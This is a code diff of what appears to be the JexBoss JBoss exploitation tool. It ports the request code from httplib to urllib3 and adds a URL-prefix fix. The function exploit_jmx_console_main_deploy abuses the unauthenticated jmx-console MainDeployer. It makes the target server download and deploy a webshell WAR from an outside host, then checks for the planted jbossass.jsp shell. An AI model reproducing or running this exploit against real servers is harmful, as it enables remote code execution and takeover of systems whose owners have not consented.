@@ -33,7 +33,7 @@ __version = "1.0.4"
 from sys import argv, exit, version_info
 
 from os import name, system
-import os, httplib
+import os
 import shutil
 from zipfile import ZipFile
 from time import sleep
@@ -130,29 +130,6 @@ def check_vul(url):
 
     return paths
 
-def getHost(url):
-    tokens = url.split("://")
-    if len(tokens) == 2: #foi fornecido protocolo
-        return tokens[1].split(":")[0]
-    else:
-        return url.split(":")[0]
-
-def getPort(url):
-    token = url[6:].split(":")
-    if len(token) == 2:
-        return token[1]
-    elif "https" in url:
-        return 443
-    else:
-        return 80
-
-def getConnection(url):
-    if 'https' in url:
-        return httplib.HTTPSConnection(getHost(url), getPort(url))
-    else:
-        return httplib.HTTPConnection(getHost(url), getPort(url))
-
-
 def auto_exploit(url, exploit_type):
     """
     Automatically exploit a URL
@@ -234,6 +211,7 @@ def shell_http(url, shell_type):
         else:
             print(stdout.replace('\\n', '\n'))
 
+#Fix: not functionality with python 3
 
 def exploit_jmx_console_main_deploy(url):
     """
@@ -242,20 +220,20 @@ def exploit_jmx_console_main_deploy(url):
     :param url: The url to exploit
     :return: The HTTP status code
     """
+    #fix KeyError of the urllib3
+    if not 'http' in url[:4]:
+        url = "http://"+url
+
     jsp = "http://www.joaomatosf.com/rnp/jbossass.war"
-    payload = ("/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service"
-               "=MainDeployer&methodIndex=19&arg0=" + jsp)
+    payload = ("/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service="
+               "MainDeployer&methodIndex=19&arg0="+jsp)
     print(GREEN + "\n * Info: This exploit will force the server to deploy the webshell " +
           "\n   available at: " + jsp + ENDC)
 
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
                "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
-
-    #r = pool.request('HEAD', url + payload, headers=headers)
-    conn = getConnection(url)
-    conn.request("HEAD", payload)
-    result = conn.getresponse().status
+    pool.request('HEAD', url + payload, redirect=False, headers=headers)
     return get_successfully(url, "/jbossass/jbossass.jsp")
 
 
